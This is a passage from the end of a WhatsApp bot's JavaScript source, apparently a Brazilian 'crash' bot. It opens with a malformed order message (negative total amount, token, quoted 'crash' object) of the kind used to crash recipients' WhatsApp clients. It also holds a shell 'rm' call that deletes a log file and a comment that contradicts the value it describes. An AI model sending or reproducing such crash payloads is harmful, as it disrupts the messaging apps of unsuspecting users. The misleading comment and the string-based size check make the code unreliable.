      message: '🚀 ~ ~ ~ Die And Eypz ~ ~ ~ 🌎 ',
      orderId: '1738143373290140', // Agrega un ID de pedido válido si es necesario
      orderTitle: 'Die And Eypz',
      token: 'AR5kboyQBc84eUxwxZkbJAIAeX4tT+I4S1fUwy2f52lYCg==',
      totalAmount1000: -9999999, // Cambié el valor a 1000, asumiendo que es el monto total en centavos
      totalCurrencyCode: 'BRL',
      thumbnail: thumb
    }
  }, {quoted: crash});
  break;



  
  
//By kalzin OwO

//comandos sem prefixo
default:
//resto



//KALZIN 
//outros bagui
if(fs.existsSync("./𝐌𝐞𝐧𝐬͢𝐚𝐠𝐞𝐧𝐬.js")) { 
statsObj = fs.statSync('./𝐌𝐞𝐧𝐬͢𝐚𝐠𝐞𝐧𝐬.js')  

if(convertBytes(statsObj.size) >= "1000 MB") {
exec("rm 𝐌𝐞𝐧𝐬͢𝐚𝐠𝐞𝐧𝐬.json") 
}
}
//quem é o lammer de papaikkkoioi oiiioiii tvhal

}

} catch(e) {
console.log(e)}
}
)
}
starttrix()
